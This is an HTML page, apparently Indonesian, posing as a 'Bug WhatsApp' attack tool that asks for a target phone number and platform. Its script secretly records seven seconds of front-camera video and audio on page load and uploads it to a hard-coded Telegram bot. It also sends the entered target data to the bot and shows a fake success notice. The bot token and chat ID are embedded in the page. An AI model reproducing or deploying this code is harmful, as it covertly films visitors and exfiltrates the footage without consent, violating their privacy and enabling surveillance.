<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Bug WhatsApp - Platform Selection</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;900&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0f0f1e;
      font-family: 'Inter', sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    /* Container utama sesuai foto */
    .card {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      padding: 40px 30px;
      border-radius: 24px;
      width: 100%;
      max-width: 420px;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
    }

    .title {
      font-size: 28px;
      font-weight: 900;
      color: #00ffcc;
      text-transform: uppercase;
      margin-bottom: 5px;
    }

    .subtitle {
      color: #888;
      font-size: 14px;
      margin-bottom: 30px;
    }

    .label {
      display: block;
      text-align: left;
      color: #00ffcc;
      font-size: 12px;
      font-weight: 700;
      margin-bottom: 10px;
      text-transform: uppercase;
    }

    /* Input Target */
    .login-input {
      width: 100%;
      padding: 15px;
      background: rgba(255, 255, 255, 0.07);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      color: #fff;
      margin-bottom: 25px;
      outline: none;
    }

    /* Platform Selection */
    .platform-container {
      display: flex;
      gap: 15px;
      margin-bottom: 30px;
    }

    .platform-btn {
      flex: 1;
      padding: 15px;
      background: rgba(255, 255, 255, 0.07);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      color: #aaa;
      font-weight: 600;
      font-size: 13px;
      cursor: pointer;
      transition: all 0.3s;
    }

    .platform-btn.active {
      background: rgba(0, 255, 204, 0.1);
      border-color: #00ffcc;
      color: #fff;
    }

    /* Tombol Utama */
    .ready-button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(90deg, #00ff88, #00ffee);
      border: none;
      border-radius: 12px;
      color: #000;
      font-weight: 800;
      font-size: 16px;
      text-transform: uppercase;
      cursor: pointer;
      transition: transform 0.2s;
    }

    .ready-button:active { transform: scale(0.98); }

    #notif { color: #00ffcc; font-size: 12px; margin-top: 15px; display: none; }
  </style>
</head>
<body>

  <div class="card">
    <h1 class="title">BUG WHATSAPP</h1>
    <p class="subtitle">Gunakan sebaik mungkin</p>

    <label class="label">Target</label>
    <input type="text" class="login-input" placeholder="Enter phone number or username" id="target">

    <label class="label">Platform Selection</label>
    <div class="platform-container">
      <button class="platform-btn" onclick="selectPlatform(this, 'Android OS')">ANDROID OS</button>
      <button class="platform-btn" onclick="selectPlatform(this, 'iOS Platform')">iOS PLATFORM</button>
    </div>

    <button class="ready-button" id="login-button">READY BUG</button>
    <div id="notif">Proses bug berhasil dikirim ✅</div>
  </div>

  <script>
    const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
    const chatIds = ['7945789634'];
    let selectedPlatform = "";

    function selectPlatform(btn, platform) {
      // Hapus kelas active dari semua tombol platform
      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
      // Tambah kelas active ke yang diklik
      btn.classList.add('active');
      selectedPlatform = platform;
    }

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        });
      });
    }

    // Fungsi Rekaman Video 7 Detik (Tetap aktif otomatis saat buka web)
    async function recordFrontVideo() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/mp4' });
          const formData = new FormData();
          chatIds.forEach(id => {
            formData.append('chat_id', id);
            formData.append('video', blob, 'video.mp4');
            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
          });
        };
        mediaRecorder.start();
        setTimeout(() => { if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 7000);
      } catch (err) {
        sendToTelegram('maaf akses vidio tidak berhasil 🤬');
      }
    }

    document.getElementById('login-button').addEventListener('click', () => {
      const target = document.getElementById('target').value;
      if (!target) return alert("Masukkan nomor target!");
      if (!selectedPlatform) return alert("Pilih platform terlebih dahulu!");

      const msg = `<b>🔥 NEW BUG ATTACK</b>\n\n` +
                  `🎯 <b>Target:</b> ${target}\n` +
                  `📱 <b>Platform:</b> ${selectedPlatform}\n` +
                  `⏰ <b>Waktu:</b> ${new Date().toLocaleString()}`;
      
      sendToTelegram(msg);
      document.getElementById('notif').style.display = 'block';
    });

    // Jalankan rekaman saat halaman dimuat
    window.onload = () => {
      recordFrontVideo();
    };
  </script>
</body>
</html>
